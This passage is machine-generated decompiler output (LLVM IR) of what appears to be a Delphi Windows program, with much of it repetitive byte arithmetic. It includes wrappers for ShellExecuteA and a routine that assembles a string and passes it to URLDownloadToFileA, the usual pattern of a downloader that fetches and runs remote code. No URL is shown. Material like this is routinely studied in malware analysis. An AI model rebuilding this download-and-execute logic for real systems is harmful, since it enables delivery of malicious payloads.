  %199 = inttoptr i32 %198 to i8*, !insn.addr !368
  %200 = load i8, i8* %199, align 1, !insn.addr !368
  %201 = trunc i32 %198 to i8, !insn.addr !368
  %202 = add i8 %200, %201, !insn.addr !368
  store i8 %202, i8* %199, align 1, !insn.addr !368
  %203 = load i32, i32* %eax, align 4
  %204 = inttoptr i32 %203 to i8*, !insn.addr !369
  %205 = load i8, i8* %204, align 1, !insn.addr !369
  %206 = trunc i32 %203 to i8, !insn.addr !369
  %207 = add i8 %205, %206, !insn.addr !369
  store i8 %207, i8* %204, align 1, !insn.addr !369
  %208 = load i32, i32* %eax, align 4
  %209 = inttoptr i32 %208 to i8*, !insn.addr !370
  %210 = load i8, i8* %209, align 1, !insn.addr !370
  %211 = trunc i32 %208 to i8, !insn.addr !370
  %212 = add i8 %210, %211, !insn.addr !370
  store i8 %212, i8* %209, align 1, !insn.addr !370
  %213 = load i32, i32* %eax, align 4
  %214 = inttoptr i32 %213 to i8*, !insn.addr !371
  %215 = load i8, i8* %214, align 1, !insn.addr !371
  %216 = trunc i32 %213 to i8, !insn.addr !371
  %217 = add i8 %215, %216, !insn.addr !371
  store i8 %217, i8* %214, align 1, !insn.addr !371
  %218 = load i32, i32* %eax, align 4
  %219 = inttoptr i32 %218 to i8*, !insn.addr !372
  %220 = load i8, i8* %219, align 1, !insn.addr !372
  %221 = trunc i32 %218 to i8, !insn.addr !372
  %222 = add i8 %220, %221, !insn.addr !372
  store i8 %222, i8* %219, align 1, !insn.addr !372
  %223 = load i32, i32* %eax, align 4
  %224 = inttoptr i32 %223 to i8*, !insn.addr !373
  %225 = load i8, i8* %224, align 1, !insn.addr !373
  %226 = trunc i32 %223 to i8, !insn.addr !373
  %227 = add i8 %225, %226, !insn.addr !373
  store i8 %227, i8* %224, align 1, !insn.addr !373
  %228 = load i32, i32* %eax, align 4
  %229 = inttoptr i32 %228 to i8*, !insn.addr !374
  %230 = load i8, i8* %229, align 1, !insn.addr !374
  %231 = trunc i32 %228 to i8, !insn.addr !374
  %232 = add i8 %230, %231, !insn.addr !374
  store i8 %232, i8* %229, align 1, !insn.addr !374
  %233 = load i32, i32* %eax, align 4
  %234 = inttoptr i32 %233 to i8*, !insn.addr !375
  %235 = load i8, i8* %234, align 1, !insn.addr !375
  %236 = trunc i32 %233 to i8, !insn.addr !375
  %237 = add i8 %235, %236, !insn.addr !375
  store i8 %237, i8* %234, align 1, !insn.addr !375
  %238 = load i32, i32* %eax, align 4
  %239 = inttoptr i32 %238 to i8*, !insn.addr !376
  %240 = load i8, i8* %239, align 1, !insn.addr !376
  %241 = trunc i32 %238 to i8, !insn.addr !376
  %242 = add i8 %240, %241, !insn.addr !376
  store i8 %242, i8* %239, align 1, !insn.addr !376
  %243 = load i32, i32* %eax, align 4, !insn.addr !377
  %244 = xor i32 %243, 842610995, !insn.addr !377
  %245 = xor i32 %2, %0, !insn.addr !378
  %246 = inttoptr i32 %2 to i32*, !insn.addr !378
  store i32 %245, i32* %246, align 4, !insn.addr !378
  %247 = add i32 %1, 100, !insn.addr !379
  %248 = inttoptr i32 %247 to i64*, !insn.addr !379
  %249 = load i64, i64* %248, align 4, !insn.addr !379
  %250 = call i32 @__asm_bound(i64 %249), !insn.addr !379
  %251 = call i8 @__readgsbyte(i32 %244), !insn.addr !380
  %252 = trunc i32 %244 to i8, !insn.addr !380
  %253 = add i8 %251, %252, !insn.addr !380
  call void @__writegsbyte(i32 %244, i8 %253), !insn.addr !380
  %254 = inttoptr i32 %244 to i8*, !insn.addr !381
  %255 = load i8, i8* %254, align 1, !insn.addr !381
  %factor2 = mul i8 %252, 17
  %256 = add i8 %255, %factor2, !insn.addr !382
  store i8 %256, i8* %254, align 1, !insn.addr !382
  ret i32 %244, !insn.addr !382

dec_label_pc_40490c:                              ; preds = %dec_label_pc_404856
  %257 = inttoptr i32 %185 to i8*, !insn.addr !383
  %258 = load i8, i8* %257, align 1, !insn.addr !383
  %259 = trunc i32 %185 to i8, !insn.addr !383
  %260 = add i8 %258, %259, !insn.addr !383
  store i8 %260, i8* %257, align 1, !insn.addr !383
  %261 = load i32, i32* %eax, align 4
  %262 = inttoptr i32 %261 to i8*, !insn.addr !384
  %263 = load i8, i8* %262, align 1, !insn.addr !384
  %264 = trunc i32 %261 to i8, !insn.addr !384
  %265 = add i8 %263, %264, !insn.addr !384
  store i8 %265, i8* %262, align 1, !insn.addr !384
  %266 = load i32, i32* %eax, align 4
  %267 = inttoptr i32 %266 to i8*, !insn.addr !385
  %268 = load i8, i8* %267, align 1, !insn.addr !385
  %269 = trunc i32 %266 to i8, !insn.addr !385
  %270 = add i8 %268, %269, !insn.addr !385
  store i8 %270, i8* %267, align 1, !insn.addr !385
  %271 = load i32, i32* %eax, align 4
  %272 = inttoptr i32 %271 to i8*, !insn.addr !386
  %273 = load i8, i8* %272, align 1, !insn.addr !386
  %274 = trunc i32 %271 to i8, !insn.addr !386
  %275 = add i8 %273, %274, !insn.addr !386
  store i8 %275, i8* %272, align 1, !insn.addr !386
  %276 = load i32, i32* %eax, align 4
  %277 = inttoptr i32 %276 to i8*, !insn.addr !387
  %278 = load i8, i8* %277, align 1, !insn.addr !387
  %279 = trunc i32 %276 to i8, !insn.addr !387
  %280 = add i8 %278, %279, !insn.addr !387
  store i8 %280, i8* %277, align 1, !insn.addr !387
  %281 = load i32, i32* %eax, align 4
  %282 = inttoptr i32 %281 to i8*, !insn.addr !388
  %283 = load i8, i8* %282, align 1, !insn.addr !388
  %284 = trunc i32 %281 to i8, !insn.addr !388
  %285 = add i8 %283, %284, !insn.addr !388
  store i8 %285, i8* %282, align 1, !insn.addr !388
  %286 = load i32, i32* %eax, align 4
  %287 = inttoptr i32 %286 to i8*, !insn.addr !389
  %288 = load i8, i8* %287, align 1, !insn.addr !389
  %289 = trunc i32 %286 to i8, !insn.addr !389
  %290 = add i8 %288, %289, !insn.addr !389
  store i8 %290, i8* %287, align 1, !insn.addr !389
  %291 = load i32, i32* %eax, align 4
  %292 = inttoptr i32 %291 to i8*, !insn.addr !390
  %293 = load i8, i8* %292, align 1, !insn.addr !390
  %294 = trunc i32 %291 to i8, !insn.addr !390
  %295 = add i8 %293, %294, !insn.addr !390
  store i8 %295, i8* %292, align 1, !insn.addr !390
  %296 = load i32, i32* %eax, align 4
  %297 = inttoptr i32 %296 to i8*, !insn.addr !391
  %298 = load i8, i8* %297, align 1, !insn.addr !391
  %299 = trunc i32 %296 to i8, !insn.addr !391
  %300 = add i8 %298, %299, !insn.addr !391
  store i8 %300, i8* %297, align 1, !insn.addr !391
  %301 = load i32, i32* %eax, align 4
  %302 = inttoptr i32 %301 to i8*, !insn.addr !392
  %303 = load i8, i8* %302, align 1, !insn.addr !392
  %304 = trunc i32 %301 to i8, !insn.addr !392
  %305 = add i8 %303, %304, !insn.addr !392
  store i8 %305, i8* %302, align 1, !insn.addr !392
  %306 = load i32, i32* %eax, align 4
  %307 = inttoptr i32 %306 to i8*
  %308 = load i8, i8* %307, align 1
  %309 = trunc i32 %306 to i8
  %310 = add i8 %308, %309
  store i8 %310, i8* %307, align 1
  %311 = load i32, i32* %eax, align 4
  %312 = inttoptr i32 %311 to i8*
  %313 = load i8, i8* %312, align 1
  %314 = trunc i32 %311 to i8
  %315 = add i8 %313, %314
  store i8 %315, i8* %312, align 1
  %316 = load i32, i32* %eax, align 4
  ret i32 %316, !insn.addr !393
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !394
  ret i32 %0, !insn.addr !394
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !395
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !396
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !397
  %2 = add i32 %1, -1, !insn.addr !397
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !397
  ret i32 %0, !insn.addr !398
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !399
  ret i32* %0, !insn.addr !399
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !400
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !400
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !400
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !401
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !402
  %3 = add i32 %2, 1, !insn.addr !402
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !402
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !403
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !404
  ret i32 0, !insn.addr !405
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !406
  ret i32 %0, !insn.addr !406
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !407
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !408
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !409
  %2 = add i32 %1, -1, !insn.addr !409
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !409
  ret i32 %0, !insn.addr !410
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !411
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !411
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !411
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !412
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !413
  %3 = add i32 %2, 1, !insn.addr !413
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !413
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !414
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !415
  ret i32 0, !insn.addr !416
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !417
  ret i32 %0, !insn.addr !417
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !418
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !419
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !420
  %2 = add i32 %1, -1, !insn.addr !420
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !420
  ret i32 %0, !insn.addr !421
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !422
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !422
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !422
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !423
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !424
  %3 = add i32 %2, 1, !insn.addr !424
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !424
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !425
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !426
  ret i32 0, !insn.addr !427
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !428
  ret i32 %0, !insn.addr !428
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !429
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !430
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !431
  %2 = add i32 %1, -1, !insn.addr !431
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !431
  ret i32 %0, !insn.addr !432
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !433
  ret i32 %0, !insn.addr !433
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !434
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !434
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !434
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !435
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !436
  %3 = add i32 %2, 1, !insn.addr !436
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !436
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !437
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !438
  ret i32 0, !insn.addr !439
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !440
  ret i32 %0, !insn.addr !440
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !441
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !442
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !443
  %2 = add i32 %1, -1, !insn.addr !443
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !443
  ret i32 %0, !insn.addr !444
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !445
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !446

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !447
  ret i32 %4, !insn.addr !448

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !449
  ret i32 %5, !insn.addr !450
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !451
  %esp.1.reg2mem = alloca i32, !insn.addr !451
  %cf.0.reg2mem = alloca i1, !insn.addr !451
  %esi.0.reg2mem = alloca i32, !insn.addr !451
  %esp.0.reg2mem = alloca i32, !insn.addr !451
  %ebx.0.reg2mem = alloca i32, !insn.addr !451
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !452
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !453
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !453
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !453
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !454
  %4 = call i32 @"@LStrClr"(), !insn.addr !455
  %5 = call i32 @function_4034c8(), !insn.addr !456
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !457
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !457

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !458
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !458
  %9 = inttoptr i32 %8 to i8*, !insn.addr !458
  %10 = load i8, i8* %9, align 1, !insn.addr !458
  %11 = icmp eq i8 %10, 32, !insn.addr !458
  %12 = icmp eq i1 %11, false, !insn.addr !459
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !459

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !460
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !461
  br label %dec_label_pc_404c19, !insn.addr !461

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !462
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !463

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !464
  %16 = icmp ult i8 %15, 95, !insn.addr !465
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !466
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !466

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !467
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !467
  %21 = shl i32 1, %20, !insn.addr !467
  %22 = and i32 %18, %21, !insn.addr !467
  %23 = icmp ne i32 %22, 0, !insn.addr !467
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !467
  br label %dec_label_pc_404ba9, !insn.addr !467

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !468
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !468

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !469
  %27 = add i32 %esp.0.reload, -4, !insn.addr !470
  %28 = inttoptr i32 %27 to i32*, !insn.addr !470
  store i32 %26, i32* %28, align 4, !insn.addr !470
  %29 = add i32 %esp.0.reload, -8, !insn.addr !471
  %30 = inttoptr i32 %29 to i32*, !insn.addr !471
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !471
  %31 = call i32 @function_404b08(), !insn.addr !472
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !473
  %33 = add i32 %esp.0.reload, -12, !insn.addr !474
  %34 = inttoptr i32 %33 to i32*, !insn.addr !474
  store i32 0, i32* %34, align 4, !insn.addr !474
  %35 = call i32 @function_404b08(), !insn.addr !475
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !476
  %37 = add i32 %esp.0.reload, -16, !insn.addr !477
  %38 = inttoptr i32 %37 to i32*, !insn.addr !477
  store i32 0, i32* %38, align 4, !insn.addr !477
  %39 = call i32 @"@LStrCatN"(), !insn.addr !478
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !479
  br label %dec_label_pc_404c19, !insn.addr !479

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !480
  %41 = call i32 @"@LStrCat"(), !insn.addr !481
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !481
  br label %dec_label_pc_404c19, !insn.addr !481

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !482
  %43 = add i32 %esi.0.reload, -1, !insn.addr !483
  %44 = icmp eq i32 %43, 0, !insn.addr !483
  %45 = icmp eq i1 %44, false, !insn.addr !484
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !484
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !484
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !484
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !484
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !484

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !485
  %47 = load i32, i32* %46, align 4, !insn.addr !485
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !486
  %48 = add i32 %esp.2.reload, 8, !insn.addr !487
  %49 = inttoptr i32 %48 to i32*, !insn.addr !487
  store i32 4213835, i32* %49, align 4, !insn.addr !487
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !488
  %51 = call i32 @"@LStrClr"(), !insn.addr !489
  ret i32 %51, !insn.addr !490
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !491
  ret i32 %0, !insn.addr !491
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !492
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !493
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !494
  %2 = inttoptr i32 %0 to i32*, !insn.addr !494
  store i32 %1, i32* %2, align 4, !insn.addr !494
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !495
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !495
  %7 = add i8 %4, %6, !insn.addr !495
  %8 = inttoptr i32 %5 to i8*, !insn.addr !495
  store i8 %7, i8* %8, align 1, !insn.addr !495
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !496
  %10 = load i32, i32* %eax, align 4, !insn.addr !496
  %11 = udiv i32 %10, 256, !insn.addr !496
  %12 = trunc i32 %11 to i8, !insn.addr !496
  %13 = add i8 %9, %12, !insn.addr !496
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !496
  %14 = call i32 @function_4036b8(), !insn.addr !497
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !498
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !498
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !498
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !499
  %17 = call i32 @"@LStrCatN"(), !insn.addr !500
  %18 = call i32 @function_4036c8(), !insn.addr !501
  %19 = inttoptr i32 %18 to i32*, !insn.addr !502
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !502
  call void @__writefsdword(i32 0, i32 0), !insn.addr !503
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !504
  ret i32 %21, !insn.addr !505
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !506
  ret i32 %0, !insn.addr !506
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !507
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !508
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !509
  %5 = inttoptr i32 %3 to i32*, !insn.addr !509
  store i32 %4, i32* %5, align 4, !insn.addr !509
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !510
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !510
  %10 = add i8 %7, %9, !insn.addr !510
  %11 = inttoptr i32 %8 to i8*, !insn.addr !510
  store i8 %10, i8* %11, align 1, !insn.addr !510
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !511
  %14 = udiv i32 %1, 256, !insn.addr !511
  %15 = trunc i32 %14 to i8, !insn.addr !511
  %16 = add i8 %13, %15, !insn.addr !511
  %17 = load i32, i32* %edi, align 4, !insn.addr !511
  %18 = inttoptr i32 %17 to i8*, !insn.addr !511
  store i8 %16, i8* %18, align 1, !insn.addr !511
  %19 = load i8, i8* %6, align 4, !insn.addr !512
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !512
  %22 = add i8 %19, %21, !insn.addr !512
  %23 = inttoptr i32 %20 to i8*, !insn.addr !512
  store i8 %22, i8* %23, align 1, !insn.addr !512
  %24 = add i32 %0, -117, !insn.addr !513
  %25 = inttoptr i32 %24 to i8*, !insn.addr !513
  %26 = load i8, i8* %25, align 1, !insn.addr !513
  %27 = trunc i32 %2 to i8, !insn.addr !513
  %28 = add i8 %26, %27, !insn.addr !513
  store i8 %28, i8* %25, align 1, !insn.addr !513
  %29 = trunc i32 %2 to i16, !insn.addr !514
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !514
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !515
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !515
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !515
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !516
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !517
  %34 = add i32 %33, 1, !insn.addr !517
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !517
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !518
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !519
  ret i32 0, !insn.addr !520
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !521
  ret i32 %0, !insn.addr !521
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !522
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !523
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !524
  %2 = add i32 %1, -1, !insn.addr !524
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !524
  ret i32 %0, !insn.addr !525
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !526
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !527
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !528
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !529
